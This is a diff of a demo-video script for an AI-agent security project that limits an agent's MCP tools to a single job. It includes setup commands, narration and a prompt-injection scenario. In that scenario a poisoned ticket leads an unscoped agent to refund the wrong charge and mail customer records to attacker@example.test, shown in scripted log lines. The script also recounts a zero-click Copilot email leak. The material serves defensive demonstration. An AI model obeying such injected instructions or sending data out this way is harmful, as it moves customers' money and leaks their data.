@@ -1,178 +1,208 @@
-# The running order
+<!--
+  This is the script the video is recorded from. It lives here rather than
+  outside the repository because two copies of a script drift, and this project
+  spends a lot of its README on what drift costs.
+-->
 
-A three-minute demo, in the order that makes the argument.
+# Scope City: the demo video script
 
-The temptation with this project is to show everything, because there is a lot
-and all of it works. That is the mistake. Scope City has one claim, and the
-demo's job is to make that claim land and then make it checkable. The Yard, the
-subagents, Code Mode, the model rotation — all of that is **evidence you offer
-when asked**, not narrative you spend time on. A judge who wants depth opens the
-README, which is written for exactly that.
-
-Structure borrowed from a demo that worked: state the premise, show the world
-while explaining it, do something real, **then go and verify it actually
-happened**, then one surprise, then credit the harness.
-
----
-
-## Before you record
-
-```bash
-# The comparison needs no keys and no server. Only this.
-pnpm --filter @scope-city/city dev
-```
-
-**Check the toolchain before you start recording.** Two prerequisites, and
-they fail differently, so check them separately -- `pnpm --version` reports
-pnpm's version or dies, and it cannot tell you which of the two is wrong:
-
-```bash
-node --version    # v22.13 or later. v23.0 to v23.3 need the flag below.
-pnpm --version    # 11.10.0
-```
-
-pnpm 11 imports `node:sqlite`, which 22.13 exposes and 23.0 to 23.3 hide behind
-a flag, so on those releases every pnpm command dies on an
-unknown-builtin-module trace. Finding that out with the recorder running is a
-bad minute.
-
-If `node --version` puts you in that window, export the flag. **The second line
-below starts the demo**, so run it when you mean to:
-
-```bash
-export NODE_OPTIONS=--experimental-sqlite
-pnpm --filter @scope-city/city dev
-```
-
-`export` lasts for one shell and no longer. This running order uses two -- the
-city server holds the first, and the verifier and the Code Mode probe run in
-the second -- so the flag has to be exported in that one as well, or those
-commands die exactly as before. It is the kind of thing that works when you
-rehearse and fails on the take, because the rehearsal used one terminal.
-
-If `pnpm --version` fails on a supported Node, the flag is not your problem and
-will not help: install pnpm 11.10.
-
-Node 22.13 is the supported line and the better answer; 23.4 unflagged
-`node:sqlite` again, so the problem is a window rather than a whole major
-version. The flag is here so a machine already inside that window is not a
-blocker at nineteen hundred hours.
-
-- **Check which model the pool is on before you record.** Development runs on
-  the local model to save the hosted quota, and the two produce different
-  videos. Measured, not guessed -- the same poisoned ticket, both ways:
-
-  | | recorded on Gemini | qwen2.5:3b |
-  |---|---|---|
-  | entries | 71 | 12 |
-  | threads | 3, subagents ran | 1 |
-  | gates raised | 1 | 0 |
-  | countersigned | 1 | 0 |
-
-  The local model read the ticket, declined the injection, and stopped. That is
-  safe and it is not a demo: **the refusals are the product**, and you only get
-  one when the agent actually attempts the overreach. A run with nothing
-  refused, no Gate and an empty Field panel demonstrates nothing.
-
-  So before recording, edit `.env` and **restart the control plane** -- the
-  pool is read once at startup, so changing it under a running server does
-  nothing:
-
-  ```bash
-  # .env, for development -- saves the hosted quota
-  SCOPE_MODELS=local/qwen
-
-  # .env, for recording. Empty means discover the hosted keys; the local slot
-  # is deliberately invisible to discovery, so emptying it is enough.
-  SCOPE_MODELS=
-
-  pnpm --filter @scope-city/demo dev    # restart, or the change has not landed
-  ```
-
-  The mission order panel names the pool it is actually on -- `local/qwen - one
-  model` against `4 models in rotation` -- so it is on screen while you record.
-  If it says the wrong one, stop and fix it before the first take.
-- Have a second terminal open at the repo root, already `cd`'d, for the verifier.
-  If you needed the SQLite flag above, export it in this one too.
-- The whole comparison is offline. If the network dies mid-recording, keep going.
+**Maximum:** 3:00  
+**Target after editing:** 2:45–2:55  
+**Track:** Best Use of TrueForge  
+**Core message:** Give an agent a key for one job, not the master key.
+**Opening principle:** Build the boundary before the first tool call, not after the first incident.
 
 ---
 
-## 0:00 — The gap an approval gate leaves (30 seconds)
+## 1. Recording setup
 
-Do not open with the city, and do not open with a refund. Open by crediting the
-harness, and then naming the thing it does not cover. A judge who has seen the
-TrueForge launch video already knows the first half, and being agreed with is a
-faster way into their attention than being introduced to.
+### Use two terminals
 
-> You have heard the one about the coding agent that deleted a production
-> database after it was told to stop.
+Do not use `pnpm dev` for the recording.
 
-> TrueForge answers that. Name a tool in `require_approval_for_tools` and it
-> does not run without a human, whatever the model has decided. The gate you
-> will see is that mechanism, holding the offices this project marks
-> irreversible.
+**Terminal 1: the control plane**
 
-Then the turn, and this is the whole video:
+```powershell
+$env:NODE_OPTIONS="--experimental-sqlite"
+cd "D:\trueforge-hack\scope city\apps\demo"
+npx tsx watch src/live-server.ts
+```
 
-> Here is the one it does not answer. Last year a crafted email made Microsoft
-> 365 Copilot leak internal data. No click. The user did nothing.
+Wait until this appears:
+
+```text
+Scope City control plane: http://127.0.0.1:8787
+```
+
+Startup may take around 40 seconds.
+
+**Terminal 2: the city UI**
+
+```powershell
+cd "D:\trueforge-hack\scope city\apps\city"
+npx vite
+```
+
+Open `http://127.0.0.1:5180/`.
+
+### Check before every take
+
+Open `http://127.0.0.1:5180/api/health`. It should show:
+
+```json
+{"ok":true,"harness":{"ok":true},"activeMissions":0}
+```
+
+Also confirm:
+
+- TrueForge: `http://127.0.0.1:8791/`
+- Mailpit: `http://127.0.0.1:8025/`
+- Ollama: `http://127.0.0.1:11434/api/tags` lists `qwen2.5:7b`
+- Browser zoom: 100%
+- Recording resolution: 1920 × 1080
+- Close notifications, personal tabs and any terminal that contains secrets
+- No `.env`, keys, tokens or personal information are visible
+- Mission order says: `Refund order #184 and notify its owner, max $49`
+- Model line begins with `local/qwen`
+- The badge next to the title says `OFFLINE`. That is correct before you
+  dispatch. It means no mission is streaming yet, not that anything is broken.
+  It changes to `LIVE` when you click Dispatch.
+- `activeMissions` is `0`. If it is `1`, a rehearsal mission is still open and
+  Dispatch will be refused. Restart the control plane.
+- On the welcome dialog, choose **Explore the island directly** before the take
+  so the first recorded frame is the full island.
+- Keep a separate, clean terminal ready with the record-verifier command. Do
+  not type paths or search for commands while recording.
+
+Restart the control plane before the final take so rehearsal cooldowns do not carry into the recording.
+
+Before that restart, restore the refundable Stripe test charge:
+
+```powershell
+cd "D:\trueforge-hack\scope city"
+node scripts/seed-stripe.mjs
+```
+
+### Pace
+
+Speak naturally at about 150–160 words per minute. Record each section as a
+separate clip and remove only silent waits. The main script deliberately leaves
+a few seconds of safety below the three-minute limit.
+
+### What to cut, and what is never cut
+
+A take that runs long gets shortened in this order:
+
+1. The GitHub proof at the end, which is already marked optional and can be
+   recorded separately.
+2. Any explanation of a panel nobody clicked.
+3. Seconds of silent waiting, using jump cuts.
+
+Two things are **never cut**, because without either the video stops making an
+argument and becomes a feature tour:
+
+- **The comparison.** The same ticket run twice, without a scope and with one.
+  It is the whole claim, and it has to come before anything else that moves.
+- **The verifier.** `node scripts/verify-record.mjs` is what turns "we logged
+  it" into "you can check it", and it takes fifteen seconds.
+- **The sentence introducing the recorded run as a real one.** Without it the
+  replay looks like an animation, and the verifier that follows looks like it is
+  checking the scripted runs. Cutting it does not shorten the video by much and
+  it costs the whole proof.
+
+Depth that gets cut is not lost. `pnpm --filter @scope-city/demo probe:code-mode`
+and the rest are evidence you offer when a judge asks, not narrative you spend
+the three minutes on.
+
+### Editing rule
+
+The model may take time to think. Record the complete flow, then remove only
+silent waiting. Use clean jump cuts. A short freeze-frame or crop is fine when
+the Gate needs more time to read, but never rearrange events or present a
+scripted event as live.
+
+If the local model writes a tool call as ordinary text and no building lights up, stop and retake. Do not describe that run as successful.
+
+---
+
+# 2. Final under-three-minute script
+
+## 0:00-0:23. The problem, and the project
+
+### Screen
+
+- Begin on the full island.
+- Slowly pan across the city and hover over one building.
+
+### Say
+
+> One command can take down a monorepo. A person may make that mistake once;
+> an AI agent translating plain English into actions can repeat it at machine
+> speed.
 >
-> **Nothing on that list ran.** It was all reads, and nobody puts reads on the
-> list -- an agent that stops for every lookup is an agent whose approvals stop
-> being read. And gating them would not have helped anyway: approval is yes or
-> no on a call. Say yes and the entire response comes back. What the agent got
-> to *see* is not a question the gate asks.
-
-> An approval gate is a brake. It is the wrong instrument for a car being
-> steered somewhere it should never have been able to go.
-
-> So I built the road instead. The agent gets one order, one charge, one
-> recipient, ten minutes — and everything else is not refused to it. It is
-> *absent*. It never appears in `tools/list`, so there is nothing for an
-> injected instruction to name.
-
-Two sentences of positioning, said once and never repeated:
-
-> The gate in this demo is TrueForge's own `require_approval_for_tools`, given
-> the list of offices that cannot be undone. I did not replace the brakes. I
-> added a road, and kept the brakes for the last step you cannot take back.
+> Scope City builds the guardrail before the first tool call. Like a hotel key
+> for one room, it gives an agent authority for one job instead of the master
+> key.
 
 ---
 
-## 0:30 — The city (25 seconds)
+## 0:23-0:58. Tech stack and architecture
 
-Now show it. Explain **while** moving, never in a paragraph first.
+### Screen
 
-> This is a repository of systems rather than files. Each district is something
-> you've connected — your ticket system, your payment processor, your mail. Each
-> building is one thing an agent can actually do in there.
+- Hover over one building, then point to its district.
+- Show the **first rendered diagram** under `README.md` → **How it works** for
+  about eight seconds. Crop to the diagram and zoom until its labels are easy
+  to read. Do not show raw Mermaid source.
 
-Drag the camera. Hover a building.
+### Say
 
-> The agent walks between them, and this line — the city limits — is what it's
-> allowed to reach. Everything about the run gets drawn here, so you're not
-> reading a log to find out what happened.
+> Scope City is a React, TypeScript and Canvas map of what an agent can reach.
+> The Exchequer is Stripe, the Post House is email, and the Forge is GitHub.
+> Each building is an MCP tool, an action the agent can call, and its colour
+> changes as work happens.
+>
+> This README diagram shows the whole architecture. TrueForge runs the agent,
+> subagents, sandbox and approval Gate. It connects only to the Scope City
+> proxy, never directly to those systems.
+>
+> The proxy is the security checkpoint. It reads the granted scope, holds the
+> credentials, checks every call, limits usage, filters responses and records
+> each decision.
 
-**Do not** name the Yard, the Gate, countersigning or field teams yet. Seven new
-words before the first claim is what makes this project hard to follow.
+### README diagram to use
 
----
+Use the first Mermaid diagram in `D:\trueforge-hack\scope city\README.md`, under
+**How it works**. It has three clear areas:
 
-## 0:55 — The same ticket, twice (65 seconds)
-
-This is the demo. Everything before it is setup and everything after is
-evidence.
-
-### Run 1 — press **1 · Without a scope**
-
-> Same support ticket both times. This first run is an ordinary integration: the
-> agent has the access a real one would have.
-
-Let it play. Read the log aloud as it lands — the lines do the work:
-
+```text
+TrueForge agent world  ↔  Scope City boundary  →  real systems
+agent + subagents         proxy + granted scope    Stripe test
+sandbox + Gate            quota + record            Mailpit + GitHub MCP
 ```
-ticket.get tkt_184
+
+Do not use the second `tools/call` flow diagram in the main video. It is useful
+for a technical judge question, but it introduces too many branches on screen.
+
+---
+
+## 0:58-1:15. Show the danger
+
+### Screen
+
+1. Choose **Test poisoned ticket containment**.
+2. Click **1 · Without a scope**.
+3. Point to the wrong `$399` refund and attacker email.
+4. Click **2 · With a scope** and point to the refusal at the city limits.
+
+The two runs print these lines. They are quoted here verbatim, em dashes and
+all, because a test reads them out of this file and checks the city still emits
+them. A script that promises output the application stopped producing is the
+drift this project spends its README on.
+
+Without a scope:
+
+```text
 Injected instruction obeyed — nothing to stop it
 charge.refund ch_185 $399.00 — SUCCEEDED
 customer.list — 3 records exfiltrated
@@ -180,127 +210,104 @@ mail.send attacker@example.test — SENT
 Mission ended. Three irreversible actions, none authorised.
 ```
 
-Stop on the refund line and point at the two numbers:
+With one:
 
-> The ticket had an instruction hidden in it, and the agent did what it said. It
-> refunded the wrong charge — **ch_185, not 184** — for **three hundred and
-> ninety-nine dollars**, not forty-nine. Then it mailed a customer list to an
-> address that isn't the customer. Nothing refused any of it, because there was
-> nothing to refuse *with*.
-
-### Run 2 — press **2 · With a scope**
-
-> Identical ticket. Same instruction inside it. The only difference is that the
-> agent was given a scope first: one order, one charge, one amount, one
-> recipient, ten minutes.
-
-Let it play, and stop on the two refusals:
-
-```
+```text
 Ticket body contains an injected instruction — flagged, not obeyed
 charge.get ch_184 — history redacted by projection
-OUT OF SCOPE  charge.refund ch_185 — not a granted charge
-OUT OF SCOPE  mail.send attacker@example.test
 ```
 
-The one sentence to get exactly right:
+and the refusal names why: the charge the ticket asked for is `not a granted charge`.
 
-> Those two calls didn't fail a permission check. The tools weren't there. We
-> don't tell the agent no — we make the thing unreachable, so there's nothing
-> for a prompt injection to talk it into.
+### Say
 
-Then the third line. It is the easiest to skip and it is the one the opening was
-for, so give it a beat:
-
-> And look at the call that *was* allowed — the charge lookup came back with the
-> customer's payment history stripped out. The scope decides what comes *back*,
-> not just what goes out.
-
-> That is the Copilot case. It was all reads, and the data simply left. You
-> could put the read on the approval list — and then approve it, because it is
-> a legitimate lookup, and the whole response comes back regardless. Approval
-> answers *whether the call happens*. This layer answers *what comes back*.
+> This ticket has a hidden instruction in it. With broad access the agent
+> refunds the wrong 399-dollar charge and emails an attacker. With a scope,
+> those tools are absent and the same attack is refused.
+>
+> This comparison is scripted. The next proposal and adversarial review are live.
 
 ---
 
-## 2:00 — The one that stops for you (20 seconds)
+## 1:15-1:50. Build a live scope and attack it
 
-The run has paused on its own.
+This section is live, but it deliberately stops before execution so the video
+does not depend on one model run behaving perfectly.
 
-> The legitimate refund — the right charge, the right amount — didn't just go
-> through either. Refunds are irreversible, so it stops here and waits for a
-> person.
+### Screen
 
-Approve it. Show it complete.
+1. In **Mission order**, keep: `Refund order #184 and notify its owner, max $49`.
+2. Click **Dispatch**.
+3. Show the proposed tools, the exact records, the `$49` ceiling and the expiry.
+4. Wait until the local adversary line appears in **The Yard**. It takes about
+   25 seconds.
+5. Point to the model name and any admitted attack. A clean result is also
+   valid. If it says the adversary was unavailable, stop and restart Ollama;
+   do not use that take.
+6. Click **Deny**. This ends the live proposal without starting a TrueForge
+   session or calling Stripe.
 
-> That's a human authorising one specific call, with the arguments in front of
-> them. Not a policy written six months ago.
+### Say
 
----
-
-## 2:20 — Now one that actually ran (20 seconds)
-
-Say this part exactly. Getting it wrong is the one thing that could sink the
-demo, because it would be the video doing what the project accuses everyone else
-of.
-
-**The two runs you just watched are scripted.** They are deterministic replays
-in the browser: no keys, no server, no model, and no record. That is on purpose
-— anyone can open the deployed site and press them — but they prove the
-interface, not the system.
-
-So do not point the verifier at them. Introduce the real one first:
-
-> Those two were scripted, deliberately: they run in the browser with no keys
-> and no server, so anyone can press them. But scripted runs prove an interface,
-> not a system. So here is a mission that actually happened.
-
-Press **Replay a real run**.
-
-> This is a captured TrueForge session, played back from its own record. Real
-> model, real proxy, and the refund it stops on is a real Stripe charge in test
-> mode — that's a genuine charge id on the gate.
-
-Be careful with the last clause. The refund **was** executed against Stripe test
-mode when this was captured, and the charge id on screen is Stripe's. But the
-record does not carry Stripe's response, so do not say the verifier proves the
-money moved. What it proves is the chain of authority around the call:
-countersign required, countersigned, allowed, completed.
-
-If you would rather not hold that distinction live, say only "a real charge id,
-countersigned by a human" and keep the Stripe detail for the questions. An
-overclaim here costs more than the sentence is worth.
-
-Let it reach the gate, and point at **THE FIELD** while it does:
-
-> And this is the delegation. The agent created two workers while it ran — a
-> source investigator and a target verifier — and every one of those threads is
-> judged by the same scope you granted the root. There is no per-subagent
-> permission to get wrong, because there isn't one.
-
-That folds the subagent story into a run you were showing anyway, which is why
-it does not need its own slot later.
+> Now a live proposal. Before any agent exists, my sentence becomes a boundary:
+> one order, one charge, one recipient, a 49-dollar ceiling and a thirty-minute
+> expiry.
+>
+> The Yard first tries known attacks. Then a model on my machine reads the
+> ticket and invents new ones. The customer data stays local.
+>
+> I deny it, so no TrueForge session and no external call is created. Now I
+> replay a completed real run, making the rest of the demo deterministic.
 
 ---
 
-## 2:40 — Go and check (30 seconds)
+## 1:50-2:28. Replay a completed real TrueForge mission
 
-**The most important twenty seconds of the video.** Do not skip it, and do not
-narrate it from memory — run the command on camera.
+This is the deterministic execution proof. Let the replay run in order; cut
+only idle gaps.
 
-> That run is a claim on a screen too. So don't take it from me.
+The replay itself is about 15 seconds. Say the first sentence below before you
+click, then follow the events. In editing, hold the Gate frame briefly if its
+arguments are too fast to read; do not reorder the replay.
 
-Switch to the terminal:
+### Screen
 
-```bash
-node scripts/verify-record.mjs apps/city/public/replays/refund-184.json
-```
+1. Hover over **Replay a real run** and say the first narration sentence.
+2. Click it, then point to **chain verified** before the replay advances.
+3. Follow the workers and changing building colours.
+4. Point to the subagents in **The Field** and response filtering in the log.
+5. Point to the sandbox verification in **The Yard**.
+6. At **The Gate**, show the exact charge and amount.
+7. Let the record show the countersign and completion.
 
-This is the whole output, not an excerpt — read it against your screen:
+### Say
 
-```
-  entries   71
+> This is not a scripted animation. It is the hash-chained record of a completed
+> real TrueForge session, replayed through the same reducer as the live feed.
+>
+> TrueForge splits investigation across subagents. Every tool call crosses the
+> same scope proxy, and allowed responses are reduced to only the fields needed.
+>
+> The sandbox verifies the refund arithmetic. The irreversible call then stops
+> at TrueForge's Gate, and the record shows the operator approving this exact
+> charge and amount. Not general access to Stripe.
 
+---
+
+## 2:28-2:45. Verify the record
+
+### Screen
+
+- Show **The Record**, or switch to a prepared terminal and run:
+
+  ```powershell
+  cd "D:\trueforge-hack\scope city"
+  node scripts/verify-record.mjs apps/city/public/replays/refund-184.json
+  ```
+
+- Point to:
+
+  ```text
   chain intact, head fedb0da15fdaf944…
 
   what it attests to
@@ -319,128 +326,187 @@ This is the whole output, not an excerpt — read it against your screen:
 
   The chain covers the entries and the sealed scope. It does not cover the
   record's top-level job, timestamps, algorithm or lossy flag, which sit
-  outside it -- so those are reported above from the scope where possible.
-```
+  outside it.
+  ```
 
-> Every live mission writes a hash-chained record, and that is the file the city
-> just replayed. This verifier re-implements the hashing independently rather
-> than importing ours, so a bug in ours can't cancel itself out. Change one entry
-> and it names the first broken link.
+  Quoted whole rather than trimmed to the flattering lines. The command keeps
+  going after `sandbox checks`, and a presenter reading a shorter version during
+  the step meant to establish trust would be showing different output from the
+  one on screen.
 
-Point at `threads 3`:
+### Say
 
-> Including the two workers you just watched appear.
+> Every live mission writes a hash-chained record. This independent verifier confirms three agent threads, two sandbox checks, one approval gate and one exact countersign. The chain is intact.
 
-Then the honesty line, which buys more credibility than it costs:
+The terminal command verifies the same shipped record being replayed in the
+browser.
 
-> It's tamper-evidence, not a signature. Nothing here is signed. What it gives
-> you is a head you can quote and compare against a copy someone else holds.
+If asked what it proves: the record does not carry Stripe's response, so it
+attests to what the boundary decided and what the operator approved, not that
+money moved. Mailpit and the Stripe test dashboard are where you check that.
 
 ---
 
-## 3:10 — A server I did not write (25 seconds)
+## 2:45-2:55. Closing
 
-The strongest twenty-five seconds available, and the one a judge is waiting for:
-everything so far ran against systems in this repository. Answer that before
-anybody has to ask.
+### Screen
 
-> Everything you have watched runs against systems I wrote. So does that boundary
-> only hold because I wrote both sides of it? Here it is in front of GitHub's own
-> MCP server, which I did not write a line of.
+- Return to the wide city view.
+- Display: **Give agents a license to act, not a master key.**
 
-```bash
+### Say
+
+> Scope City does not ask the model to behave. It limits what the model can reach.
+>
+> The agent received one job, one payment and one human-approved action. Not
+> our Stripe account.
+
+Stop here. Do not add another feature list.
+
+---
+
+# 3. Important truth checks
+
+Say:
+
+- **Tamper-evident hash chain**, not immutable record.
+- The unsafe comparison is scripted. The scope proposal and local adversary are
+  live. The completed execution is a verified record of an earlier real run.
+- The shipped record is from a completed real mission.
+- Subagents share the mission scope.
+- The agent never receives the Stripe key; the proxy holds the upstream credential.
+- The recorded run is replayed through the same reducer as live events.
+
+Do not claim:
+
+- The scripted comparison contacted Stripe or TrueForge.
+- The verifier proves that Stripe moved money.
+- Every subagent has different permissions.
+- Scope City eliminates all powerful credentials.
+- The model can never be compromised.
+- A feature or number that is not visibly present.
+
+---
+
+# 4. Full architecture explanation
+
+Use this longer answer if a judge asks, “What happens from the moment I type a
+request?” Do not add all of it to the three-minute narration.
+
+> The browser is a React and TypeScript application with a Canvas city. The city
+> is not the security boundary; it is the way we make that boundary visible.
+>
+> First, the Node control plane receives the natural-language job. The intent
+> compiler resolves names such as order 184 into exact record IDs, then drafts a
+> short-lived scope. That scope lists the MCP tools the job may use, the exact
+> records it may touch, amount and call limits, allowed response fields, and an
+> expiry time.
+>
+> Before an agent exists, the Yard tests the draft. Fixed probes check known
+> failure cases, and local Qwen reads the ticket and proposes attacks the fixed
+> tests may not have imagined. A human can inspect, deny or grant the result.
+>
+> Only after grant does the control plane create a TrueForge session. TrueForge
+> supplies the main agent, dynamic subagents, sandbox execution and its human
+> approval Gate. Every thread inherits the same sealed mission scope.
+>
+> TrueForge does not connect directly to Stripe, GitHub or email. Its only MCP
+> route is the Scope City proxy. On `tools/list`, the proxy exposes only granted
+> tools. On every call, it checks the tool, record ID, amount, call budget and
+> expiry. An atomic ledger prevents two workers from spending the same one-call
+> allowance. Irreversible calls pause at TrueForge's Gate, and the proxy accepts
+> only a countersign for those exact arguments. The proxy holds
+> the upstream credentials. It then calls Stripe test mode, GitHub MCP or
+> Mailpit and removes response fields the scope did not grant.
+>
+> Finally, TrueForge events and proxy decisions are appended to a hash-chained
+> mission record and streamed to the browser over Server-Sent Events. The UI
+> reduces those events into workers, lit buildings, refusals and gates. A
+> recorded mission goes through that same reducer, and the independent verifier
+> checks the chain. So the animation is a view of the enforcement; it is not the
+> source of truth.
+
+### Stack at a glance
+
+- **City UI:** React, TypeScript and Canvas
+- **Control plane:** Node.js, TypeScript, REST and Server-Sent Events
+- **Agent runtime:** TrueForge SDK and server
+- **Models:** local Ollama/Qwen first, Gemini slots as error/rate-limit fallback
+- **Enforcement:** MCP scope proxy, sealed scope evaluator and atomic quota ledger
+- **Connected systems:** Stripe test mode, GitHub MCP and Mailpit SMTP
+- **Proof:** SHA-256 hash-chained mission record plus an independent verifier
+- **Local infrastructure:** Docker Compose for TrueForge, PostgreSQL, Redis and Mailpit
+
+### Architecture in one sentence
+
+> Scope City compiles least privilege before execution, TrueForge performs the
+> work, the MCP proxy enforces every interaction, and the record proves what
+> happened.
+
+---
+
+# 5. Emergency shorter narration
+
+Use this if the first edit is longer than three minutes:
+
+> One command can take down a monorepo. An agent can repeat that mistake at
+> machine speed, so Scope City builds the boundary before the first tool call.
+>
+> React and Canvas draw systems as districts and MCP tools as buildings. A
+> request becomes a short-lived scope, and a local model attacks it before I
+> grant anything. TrueForge runs agents, subagents, sandbox and approval. Our
+> MCP proxy limits tools, requests and responses before Stripe, GitHub or email.
+>
+> Without a scope, this poisoned ticket causes the wrong refund and sends data
+> to an attacker. The live proposal instead allows one order, one charge, one
+> recipient and a 49-dollar ceiling. I deny it, so no external call is made.
+>
+> I then replay the verified record of a completed real TrueForge mission.
+> Subagents investigate, responses are filtered, the sandbox verifies the work,
+> and the exact refund pauses for human approval.
+>
+> The independent verifier confirms the threads, sandbox checks and countersign.
+> We do not ask the model to behave. We limit what it can reach.
+
+---
+
+# 6. Optional GitHub proof, recorded separately rather than in the main video
+
+This is strong backup material for judge questions, but it adds network and
+token risk to a three-minute take. Run it only in a prepared terminal and never
+show the token:
+
+```powershell
+cd "D:\trueforge-hack\scope city"
 pnpm --filter @scope-city/demo probe:forge-harness
 ```
 
-```
-  upstream tools        3 offices exposed by the Forge
-  harness session       <id> on <model>          # both vary per run
-  visible to the agent  issue.get
-  through the boundary  call.allowed issue.get
+Explain the result in one line:
 
-  HELD  one office visible, and the harness reached GitHub through it
-```
-
-This is the whole chain, not an adapter: a real TrueForge session, the proxy,
-and GitHub's server at the far end. `visible to the agent` is a `tools/list`
-asked through the boundary — what the harness could see, not what it happened
-to call.
-
-Point at the gap between the numbers:
-
-> Twenty-six tools on that server. Among them `merge_pull_request`, `push_files`,
-> `create_repository` — everything a token can reach. This agent's scope grants
-> one, over one issue, and one is what its tool list contains. The other
-> twenty-five are not refused. They are not there.
-
-And the detail that makes it more than a filter, which is worth the last ten
-seconds:
-
-> The repository name is not an argument the agent can set. The office supplies
-> its own. So there is no sentence anyone can write, in an issue or anywhere
-> else, that points this at a different repository.
-
-(`probe:forge` is the same district without the harness in front of it — useful
-when this one fails and you need to know which half broke.)
-
-**Cut this before anything else** if you are over time, and say the one line
-instead: *"the same scope works in front of GitHub's own MCP server, and it is in
-the README."* Code Mode and the Yard are the other two candidates, both in
-"Things to say only if asked".
+> GitHub's MCP server offers many tools; this mission exposes only `issue.get`,
+> so the other tools are absent from the agent's world.
 
 ---
 
-## 3:35 — Close (10 seconds)
+# 7. YouTube upload
 
-> Built on TrueForge. The sandbox, the subagents and the approval gate are its
-> primitives — I did not reimplement any of them, and the gate you watched is
-> its own `require_approval_for_tools`.
->
-> What I added is the road: the agent could not have attempted most of what it
-> was asked to do, so most of the time there was nothing to approve. Scope City
-> is the boundary, and the city is so you can watch it hold.
+## Suggested title
 
----
+**Scope City: A Visible Safety Boundary for TrueForge Agents | 3-Minute Demo**
 
-## Things to say only if asked
+## Suggested description
 
-Keep these out of the main run. Each is strong and each costs you thirty seconds
-you do not have.
+> Scope City gives AI agents a temporary, task-specific license to act instead of broad standing access. Built on TrueForge, it combines real MCP tools, sandbox verification, subagents, human approval and a tamper-evident mission record in an interactive city.
 
-| If they ask | The answer |
-|---|---|
-| "Is the refund real?" | Yes — Stripe test mode, a real charge, a real irreversible refund, and the key never reaches the agent. Note what the *record* attests to, though: countersign required, countersigned, allowed, completed. Stripe's own response is not in the chain, so the artifact proves the authority around the call rather than the money moving. |
-| "Does the model pick the scope?" | It drafts; the sentence decides. An id that isn't in what you wrote is dropped, including a shortened one. |
-| "What if the harness rate-limits?" | A rate limit ends the turn, not the session. It waits for that key rather than throwing the work away. |
-| "Could you run a different model?" | Any OpenAI-compatible endpoint, including a local one. The boundary doesn't change — that's the point of it being outside the model. |
-| "How do you know the docs are right?" | Two places TrueForge's documentation and the harness disagree are written up in `docs/TRUEFORGE.md`, both found by probing rather than reading. |
-| "But the agent has a sandbox — can't it just write Python?" | Tested. `pnpm --filter @scope-city/demo probe:code-mode`: in-scope allowed and still filtered, out-of-scope refused, countersigned not callable from the sandbox. Arbitrary code, same boundary. |
-| "What if the operator grants too much?" | That is the Yard, and it runs before anything is granted: it probes the drafted scope, finds an office answering with more than the job needs, and the scope is narrowed and re-probed clean. An over-reach caught before the grant is the only kind that costs nothing. |
-| "Isn't this what `require_approval_for_tools` already does?" | It is what raises the gate here, and it is the right instrument for the last irreversible step. It is the wrong one for everything before it: approving every call is how an operator stops reading them, and a read is never destructive so it never pauses at all. That is the Copilot case in one sentence. |
+## Final upload checklist
 
----
-
-## What to cut if you are over time
-
-This runs about three and a half minutes read at a normal pace, which is long.
-Cut in this order:
-
-1. The clean-job run, if you were going to show it at all. It proves the
-   boundary has no false positives, and nobody doubts that yet.
-2. The Forge at 3:10, down to its one sentence. Painful, and still the first
-   whole beat to go, because the two-run comparison is the argument and this is
-   a corroboration of it.
-3. The subagent aside at 2:20. Say only "a captured session" and move on.
-
-**Never cut** five things. The opening turn, because without the Copilot case
-this is a project about refunds rather than about a category of failure. The
-two-run comparison, which is the argument. The projection line, which is what
-the opening was for and is the only part an approval gate cannot do. The
-verifier, which is the proof. And the sentence introducing the recorded run as a
-real one, which is what keeps the proof honest — the two runs before it are
-scripted, and a video that blurs that is the video doing what this project
-accuses everyone else of.
-
-The third of those used to be first on this list. It was cut in an earlier draft
-of the running order, and the video then made a claim it never paid off — the
-opening promised an answer to a leak and the body only ever refused writes.
+- Duration is below 3:00.
+- The live proposal and adversary ran on camera; the execution is clearly
+  labelled as a verified real-run replay.
+- Project, architecture and live demo are all included.
+- Scripted and live sections are labelled honestly.
+- Text is readable at normal YouTube size.
+- Voice is louder than background audio.
+- No secrets or personal data appear.
+- Upload is **Public** or **Unlisted**, not Private.
+- Open the final link in an incognito window before submitting it.
